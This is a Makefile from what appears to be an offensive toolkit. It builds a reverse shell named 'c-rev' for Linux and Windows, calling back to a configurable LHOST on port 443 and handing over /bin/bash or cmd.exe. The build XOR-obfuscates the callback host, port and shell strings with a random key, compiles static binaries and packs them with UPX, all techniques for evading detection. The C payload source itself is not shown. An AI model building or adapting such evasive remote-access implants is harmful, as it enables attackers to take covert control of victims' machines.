# Run 'make setup' first!
util = ../../
################################################
# Do not wrap in quotes
LHOST=$(shell $(util)customize_shell.py --no-prompt --get-opt LHOST)
LPORT=443
LINUX-SHELL=/bin/bash
WINDOWS-SHELL=cmd.exe
################################################
# COMPILATION OPTIONS
flags =-static -O3 -I $(shell pwd)/includes
# use --brute for smaller files (that take a long time to pack)
upx-flags =

# NAMES
obf-key-file=.obf.key
release = release/
src-dir = src/
rev = c-rev

# TARGETS
linux-release = $(release)linux/
windows-release = $(release)windows/
linux-src = $(src-dir)$(rev).linux.c
windows-src = $(src-dir)$(rev).windows.c
linux-template = $(rev).linux.template.c
windows-template = $(rev).windows.template.c

# COMPUTED
OBF-KEY='$(shell cat $(obf-key-file))'

################################################
LHOST-OBF = '$(shell echo -n $(LHOST) | $(util)xor.py $(OBF-KEY))'
LPORT-OBF = '$(shell echo -n $(LPORT) | $(util)xor.py $(OBF-KEY))'
PROTO-OBF = '$(shell echo -n $(PROTO) | $(util)xor.py $(OBF-KEY))'
LINUX-SHELL-OBF = '$(shell echo -n $(LINUX-SHELL) | $(util)xor.py $(OBF-KEY))'
WINDOWS-SHELL-OBF = '$(shell echo -n $(WINDOWS-SHELL) | $(util)xor.py $(OBF-KEY))'
################################################

customize-prefix = $(util)customize_shell.py --PROTO $(PROTO-OBF) --LHOST $(LHOST-OBF) --LPORT $(LPORT-OBF) --OBF_KEY $(OBF-KEY)

.PHONY: all setup clean obf-key

all: $(windows-release)$(rev).upx $(linux-release)$(rev).upx

windows-packed: $(windows-release)$(rev).upx
linux-packed: $(linux-release)$(rev).upx

linux-rev: $(linux-release)$(rev)
windows-rev: $(windows-release)$(rev).exe

$(windows-release)$(rev).upx: $(windows-release)$(rev).exe
	upx -f $(upx-flags) $(windows-release)$(rev).exe -o $(windows-release)$(rev).upx
	touch $(windows-release)$(rev).upx

$(linux-release)$(rev).upx: $(linux-release)$(rev)
	upx -f $(upx-flags) $(linux-release)$(rev) -o $(linux-release)$(rev).upx
	touch $(linux-release)$(rev).upx

$(linux-release)$(rev):  $(linux-src)
	gcc $(flags) -o $(linux-release)$(rev) $(linux-src)

$(windows-release)$(rev).exe:    $(windows-src)
	i686-w64-mingw32-gcc  $(windows-src) -o $(windows-release)$(rev).exe  $(flags) -march=i686 -Wl,-lws2_32

$(linux-src):   $(linux-template)
	$(customize-prefix) --SHELL $(LINUX-SHELL-OBF) $(linux-template) | tee $(linux-src).tmp
	cmp --silent $(linux-src).tmp $(linux-src) || cp $(linux-src).tmp $(linux-src)
	rm $(linux-src).tmp
	
$(windows-src):   $(windows-template)
	$(customize-prefix) --SHELL $(WINDOWS-SHELL-OBF) $(windows-template) | tee $(windows-src).tmp
	cmp --silent $(windows-src).tmp $(windows-src) || cp $(windows-src).tmp $(windows-src)
	rm $(windows-src).tmp

obf-key:
	head -c 1000 /dev/urandom | md5sum | cut -d" " -f1 > $(obf-key-file)

clean: obf-key
	rm -f $(linux-release)*
	rm -f $(windows-release)*
	rm -f $(linux-src)
	rm -f $(windows-src)
    

setup: obf-key
	apt update; apt install -y mingw-w64
	mkdir -p $(linux-release)
	mkdir -p $(windows-release)
	mkdir -p $(src-dir)

